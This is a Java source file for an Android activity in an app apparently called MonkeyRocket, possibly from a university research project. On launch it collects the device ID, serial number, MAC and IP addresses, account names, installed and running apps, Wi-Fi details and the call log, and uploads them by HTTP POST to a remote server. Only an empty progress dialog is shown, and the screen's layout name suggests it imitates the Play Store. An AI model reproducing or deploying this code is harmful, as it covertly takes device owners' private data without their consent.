package com.fiu_CaSPR.Sajib.MonkeyRocket;

/**
 * Created by Sajib on 3/24/2019.
 */

import android.app.ActivityManager;
import android.app.ProgressDialog;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.android_examples.getinstalledappiconname_android_examplescom.R;

import java.io.ByteArrayInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class SnapshotActivity2 extends AppCompatActivity {

    int serverResponseCode = 0;
    ProgressDialog dialog = null;
    String newString = "";
    String upLoadServerUri = null;
    /**********  File Path *************/
    final String uploadFilePath = "/mnt/sdcard/";
    String uploadFileName;
    SimpleDateFormat dateFormat= new SimpleDateFormat("yyyyddMM", Locale.ENGLISH);
    final String cDateTime=dateFormat.format(new Date());

    private String filepath = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.playstore_layout);

/*        if (ActivityCompat.checkSelfPermission(this, GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + getPackageName()));
            intent.addCategory(Intent.CATEGORY_DEFAULT);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }*/

        newString+=" Device ID: "+getDeviceID()+"\n Battery Level: "+getBatteryPercentage()+"\n";
        newString+=" Device Name: "+ DeviceTracker.getDeviceName()+"\n Model: "+ Build.MODEL+"\n Serial: "+ Build.SERIAL+"\n Wlan0: "+ IPTracker.getMACAddress("wlan0")+"\n Eth0: "+ IPTracker.getMACAddress("eth0")+"\n IPv4: "+ IPTracker.getIPAddress(true)+"\n IPv6: "+ IPTracker.getIPAddress(false)+"\n";
        newString+=" Total External: "+ StorageTracker.totalExternalValue+" MB\n";
        newString+=" Free External: "+ StorageTracker.freeExternalValue+" MB\n";
        newString+=" Total Internal: "+ StorageTracker.totalInternalValue+" MB\n";
        newString+=" Free Internal: "+ StorageTracker.freeInternalValue+" MB\n";
        //newString+=" Total RAM: "+ StorageTracker.totalRamValue+"\n";+"
        //newString+=" Free RAM: "+ StorageTracker.freeRamValue+"\n";
        newString+=AccountTracker.getAccounts(this);
        newString+=installedApps();
        newString+=runningApps(this)+"\n";
        newString+=" Wifi:\n"+ MainActivity.sb+"\n";
        newString+=CallTracker.getCallLog(this);
        //Toast.makeText(this, newString, Toast.LENGTH_SHORT).show();

        /*filepath = "Snapshot"+cDateTime+".txt";
        uploadFileName = "Snapshot"+"_"+cDateTime+".txt";*/
        filepath = "Snapshot"+cDateTime+".zip";
        uploadFileName = "Snapshot"+"_"+cDateTime+".zip";

        SimpleDateFormat sdf = new SimpleDateFormat("MM/dd/yyyy hh:mm:ss");
        String date = sdf.format(new Date());
        TextView snapshot = (TextView) findViewById(R.id.snapshot);
        //snapshot.setText("Current Snapshot: "+date+"\n\n"+newString);

        Button exitButton = (Button) findViewById(R.id.exit);
        exitButton.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                // Perform action on click
                exitToHome();
            }
        });


        dummy();

        doLastJob();
    }

    public void exitToHome(){
        Intent a = new Intent(Intent.ACTION_MAIN);
        a.addCategory(Intent.CATEGORY_HOME);
        a.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(a);
    }

    public String getBatteryPercentage()
    {
        IntentFilter iFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = getApplicationContext().registerReceiver(null, iFilter);

        int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;

        float batteryLvl = level / (float) scale;
        String batteryPct = Integer.toString((int) (batteryLvl * 100));

        Log.d("Battery Level: ",batteryPct);
        //Toast.makeText(this, "Battery Level: "+batteryPct, Toast.LENGTH_SHORT).show();
        return batteryPct;
    }

    public String getDeviceID()
    {
        String androidId = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ANDROID_ID);
        Log.d("Device ID: ",androidId);
        //Toast.makeText(this, "Device ID: "+androidId, Toast.LENGTH_SHORT).show();
        return androidId;
    }

    public String installedApps()
    {
        String appList="";
        int count=0;
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        for (int i=0; i < packList.size(); i++)
        {
            PackageInfo packInfo = packList.get(i);
            if (  (packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0)
            {
                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                appList += " "+appName+" \n";
                count++;
            }
        }
        appList = "\n App Count: "+count+"\n"+appList;

        return appList;
    }

    public String runningApps(Context context)
    {
        String appList="";
        int count=0;

        if (Build.VERSION.SDK_INT >= 21) {
            UsageStatsManager mUsageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
            long time = System.currentTimeMillis();
            List<UsageStats> stats = mUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, time - 1000 * 10, time);

            /*if (stats == null || stats.isEmpty()) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                context.startActivity(intent);
            }*/

            for (UsageStats stat : stats) {
                appList += " " + stat.getPackageName() + " \n";
                count++;
            }
        }
        else {
            ActivityManager activityManager = (ActivityManager) this
                    .getSystemService(ACTIVITY_SERVICE);

            List<ActivityManager.RunningAppProcessInfo> procInfos = activityManager
                    .getRunningAppProcesses();
            for (int idx = 0; idx < procInfos.size(); idx++) {

                appList += " " + procInfos.get(idx).processName + " \n";
                count++;
            }
        }
        appList = "\n Running App Count: "+count+"\n"+appList;

        return appList;
    }

    private void doLastJob() {

        /************* File Upload Code ****************/
        upLoadServerUri = "http://users.cis.fiu.edu/~stalu001/upload.php";

        dialog = ProgressDialog.show(SnapshotActivity2.this, "", "", true);

        try {
            new Thread(new Runnable() {
                public void run() {
                    runOnUiThread(new Runnable() {
                        public void run() {
                            //messageText.setText("uploading started.....");
                        }
                    });

                    uploadFile(filepath);

                }
            }).start();
        }
        catch (Exception e)
        {
            System.out.println(e);
        }
        /************* File Upload Code Ends ****************/
    }
    public int uploadFile(String sourceFileUri) {


        String fileName = sourceFileUri;

        HttpURLConnection conn = null;
        DataOutputStream dos = null;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;
        //``        11File sourceFile = new File(sourceFileUri);


        try {

            // open a URL connection to the Servlet
            //FileInputStream fileInputStream = new FileInputStream(myInternalFile);
            URL url = new URL(upLoadServerUri);

            // Open a HTTP  connection to  the URL
            conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true); // Allow Inputs
            conn.setDoOutput(true); // Allow Outputs
            conn.setUseCaches(false); // Don't use a Cached Copy
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            conn.setRequestProperty("uploaded_file", fileName);

            dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"uploaded_file\";filename=\""
                    + fileName + "\"" + lineEnd);

            dos.writeBytes(lineEnd);

            InputStream fileInputStream = new ByteArrayInputStream(newString.getBytes());

            // create a buffer of  maximum size
            bytesAvailable = fileInputStream.available();

            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];

            // read file and write it into form...
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);

            while (bytesRead > 0) {

                dos.write(buffer, 0, bufferSize);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);

            }

            // send multipart form data necesssary after file data...
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

            // Responses from the server (code and message)
            serverResponseCode = conn.getResponseCode();
            String serverResponseMessage = conn.getResponseMessage();

            Log.i("uploadFile", "HTTP Response is : "
                    + serverResponseMessage + ": " + serverResponseCode);

            if(serverResponseCode == 200){

                runOnUiThread(new Runnable() {
                    public void run() {

                        String msg = "File Upload Completed";

                        //messageText.setText(msg);
                        Toast.makeText(SnapshotActivity2.this, "Data Upload Complete!", Toast.LENGTH_SHORT).show();
                    }
                });
            }

            //close the streams //
            fileInputStream.close();
            dos.flush();
            dos.close();
        }
        catch (MalformedURLException ex) {

            dialog.dismiss();
            ex.printStackTrace();

            runOnUiThread(new Runnable() {
                public void run() {
                    //messageText.setText("MalformedURLException Exception : check script url.");
                    Toast.makeText(SnapshotActivity2.this, "MalformedURLException", Toast.LENGTH_SHORT).show();
                }
            });

            Log.e("Upload file to server", "error: " + ex.getMessage(), ex);
        } catch (Exception e) {

            dialog.dismiss();
            e.printStackTrace();

            runOnUiThread(new Runnable() {
                public void run() {
                    //messageText.setText("Got Exception : see logcat ");
                    Toast.makeText(SnapshotActivity2.this, "Got Exception : see logcat ",
                            Toast.LENGTH_SHORT).show();
                }
            });
            Log.e("Upload Exception", "Exception : "
                    + e.getMessage(), e);
        }
        dialog.dismiss();
        return serverResponseCode;

    } // End else block

    public void zip(String[] files)
    {
        // first parameter is d files second parameter is zip
        // file name
        ZipActivity zipManager = new ZipActivity();

        // calling the zip function
        zipManager.zip(this, files, "snapshot.zip");
    }

    public void unzip()
    {
        ZipActivity zipManager = new ZipActivity();

        // calling the unzip function
        zipManager.unzip("snapshot.zip");
    }

    public void dummy()
    {
/*        //zip the file
        String[] s = new String[2];
        // Type the path of the files in here
        s[0] = filepath;
        zip(s);*/

        ZipActivity zipManager = new ZipActivity();
        zipManager.writeFile(this, filepath, newString);
    }
}

